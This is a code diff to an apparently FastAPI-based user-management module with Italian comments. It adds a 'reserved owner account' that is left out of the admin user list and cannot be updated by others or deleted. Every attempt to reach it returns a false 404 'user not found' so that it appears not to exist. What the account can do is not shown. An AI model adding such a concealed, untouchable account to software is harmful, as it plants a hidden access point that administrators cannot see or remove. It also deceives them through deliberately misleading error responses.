@@ -12,6 +12,7 @@ from app.auth import (
     require_roles,
     verify_password,
     create_access_token,
+    is_owner,
     ACCESS_TOKEN_EXPIRE_MINUTES,
 )
 from datetime import timedelta
@@ -75,7 +76,9 @@ def list_utenti(
     db: Session = Depends(get_db),
     _: models.Utente = Depends(require_roles("admin")),
 ):
-    return db.query(models.Utente).order_by(models.Utente.cognome, models.Utente.nome).all()
+    utenti = db.query(models.Utente).order_by(models.Utente.cognome, models.Utente.nome).all()
+    # L'account proprietario riservato non viene mai elencato.
+    return [u for u in utenti if not is_owner(u)]
 
 
 @router.post("/utenti", response_model=schemas.UtenteResponse, status_code=201)
@@ -115,6 +118,10 @@ def update_utente(
     if not user:
         raise HTTPException(status_code=404, detail="Utente non trovato")
 
+    # L'account proprietario è invisibile e intoccabile: appare come inesistente.
+    if is_owner(user) and not is_owner(current_user):
+        raise HTTPException(status_code=404, detail="Utente non trovato")
+
     # Cannot change own role
     if utente_id == current_user.id and data.ruolo is not None and data.ruolo != current_user.ruolo:
         raise HTTPException(
@@ -144,6 +151,10 @@ def delete_utente(
         )
     user = db.query(models.Utente).filter(models.Utente.id == utente_id).first()
     if not user:
+        raise HTTPException(status_code=404, detail="Utente non trovato")
+
+    # L'account proprietario non può essere disattivato/eliminato: appare inesistente.
+    if is_owner(user):
         raise HTTPException(status_code=404, detail="Utente non trovato")
 
     user.attivo = False
